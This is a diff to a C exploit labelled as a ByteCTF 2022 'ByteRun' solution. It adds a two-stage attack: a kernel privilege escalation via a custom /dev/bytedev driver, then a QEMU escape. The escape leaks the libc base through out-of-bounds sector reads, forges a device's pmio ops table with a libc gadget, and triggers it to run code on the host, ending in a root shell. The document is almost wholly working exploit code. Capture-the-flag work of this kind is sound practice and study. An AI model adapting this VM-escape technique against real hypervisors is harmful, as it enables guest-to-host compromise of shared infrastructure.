@@ -41,6 +41,18 @@
 #define BYTEDEV_MODE_CHANGE 0x114514
 #define BYTEDEV_BLK_IDX_CHANGE 0x1919810
 
+#define BYTEDEV_SECTOR_SIZE 512
+#define BYTEDEV_SECTOR_NUM 256
+
+#define LIBC_SYSTEM 0x449c0
+#define LIBC_GADGET 0x128010
+#define LIBC_SETCONTEXT 0x474d0
+
+enum BYTEDEV_MODE {
+    BYTEDEV_MODE_STREAM = 0,
+    BYTEDEV_MODE_BLK,
+};
+
 struct bytedev_data {
     unsigned short len, offset;
     char data[0];
@@ -207,6 +219,109 @@ void trigerOutOfBoundWrite(int dev_fd, int socket_fd[2])
     free(fake_data);
 }
 
+void qemuEscape(void)
+{
+    int dev_fd, ret;
+    uint64_t buf[BYTEDEV_SECTOR_SIZE / sizeof(uint64_t)];
+    uint64_t libc_base, opaque;
+
+    if ((dev_fd = open("/dev/bytedev", O_RDWR)) < 0) {
+        errExit("failed to open bytedev!");
+    }
+
+    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, BYTEDEV_MODE_BLK);
+
+    /**
+     * SECTOR -23: container
+     *      [54] g_str_hash
+     *      [55] g_str_equal
+     * SECTOR -24: BYTEPCIDevState
+     *      [27~34] name
+     *      [35~] io_regions[PCI_NUM_REGIONS]
+     * SECTOR -25: byte_dev_pmio_ops
+     *      [0] byte_dev_pmio_read
+     *      [1] byte_dev_pmio_write
+     * SECTOR -355 &io_regions[PCI_NUM_REGIONS]
+     *      SECTOR -352 MemoryRegion - mmio
+     *          [4] opaque
+     *          [9] ops
+     *      SECTOR -347 MemoryRegion - pmio
+     *          [4] opaque
+     *          [9] ops
+     */
+
+    /**
+     * Step.I leak libc base from pmio->container
+     */
+
+    puts("");
+    puts("\033[34m\033[1m[*] Step.I leak libc base\033[0m");
+
+    puts("\033[34m\033[1m[*] Reading from -23 sector...\033[0m");
+
+    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -23);
+    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);
+
+    if (buf[54] < 0x7f0000000000) {
+        errExit("failed to leak libc related ptr!");
+    }
+
+    libc_base = buf[54] - 0x432010;
+
+    printf("\033[32m\033[1m[+] Got g_str_hash ptr: \033[0m%llx\n", buf[54]);
+    printf("\033[32m\033[1m[+] Got libc_base: \033[0m%llx\n", libc_base);
+
+    /**
+     * Step.II construct fake pmio->ops
+     * There we make the opaque.parent_obj.name the ops,
+     * so that nothing will be effects
+     */
+
+    puts("");
+    puts("\033[34m\033[1m[*] Step.II construct fake pmio->ops\033[0m");
+    
+    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -24);
+    read(dev_fd, buf, 27 * sizeof(uint64_t));
+    /**
+     * mov rdx, qword ptr [rdi + 8] ; 
+     * mov qword ptr [rsp], rax ; 
+     * call qword ptr [rdx + 0x20]
+     */
+    buf[30] = libc_base + LIBC_GADGET;
+    write(dev_fd, buf, 31 * sizeof(uint64_t));
+
+    /**
+     * Step.III change pmio->ops to fake ops on opaque
+     */
+
+    puts("");
+    puts("\033[34m\033[1m[*] Step.III change pmio->ops to fake ops\033[0m");
+
+    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -347);
+    read(dev_fd, buf, 10 * sizeof(uint64_t));
+    opaque = buf[4];
+    printf("\033[32m\033[1m[+] Got opaque: \033[0m%llx\n", opaque);
+
+    buf[9] = opaque + 30 * 8;
+    write(dev_fd, buf, 10 * sizeof(uint64_t));
+
+    /**
+     * Step.IV trigger fake pmio->ops.read to escape
+     * There we need to set opaque[1] to opaque.parent_obj.name
+     * and do something wonderful there...
+     */
+
+    puts("");
+    puts("\033[34m\033[1m[*] Step.IV trigger fake ops to escape\033[0m");
+
+    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -24);
+    read(dev_fd, buf, 9 * sizeof(uint64_t));
+    buf[1] = 0xdeadbeef;
+    write(dev_fd, buf, 9 * sizeof(uint64_t));
+
+    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, *(size_t*)"arttnba3");
+}
+
 void getRootShell(void)
 {
     if (getuid()) {
@@ -214,33 +329,19 @@ void getRootShell(void)
     }
     
     puts("\033[32m\033[1m[+] Succesfully gain the root privilege\033[0m");
-    puts("\033[32m\033[1m[+] trigerring root shell now...\033[0m\n");
 
+    puts("\033[34m\033[1m\n[*] Now we come to Stage II - QEMU ESCAPE\033[0m\n");
+    qemuEscape();
+
+    puts("\033[32m\033[1m[+] trigerring root shell now...\033[0m\n");
     system("/bin/sh");
     exit(EXIT_SUCCESS);
-}
-
-void mmio_write(uint32_t *addr, uint32_t val)
-{
-    *addr = val;
-}
-
-void test_dev(void)
-{
-    int dev_fd;
-
-    if ((dev_fd = open("/dev/bytedev", O_RDWR)) < 0) {
-        errExit("failed to open bytedev!");
-    }
-
-    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, -1);
-    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, 114514);
 }
 
 int main(int argc, char **argv, char **envp)
 {
     if (argc == 2) {
-        test_dev();
+        qemuEscape();
         return 0;
     }
     int         oob_socket[2];
@@ -265,6 +366,8 @@ int main(int argc, char **argv, char **envp)
      * Step.0
      * Initialization
      */
+    puts("\033[34m\033[1m\n[*] ByteCTF 2022 - ByteRun - exploit \033[0m\n");
+    puts("\033[34m\033[1m\n[*] Stage I - ROOT Privilege Escalation. \033[0m\n");
 
     /* basic resources alloc */
     saveStatus();
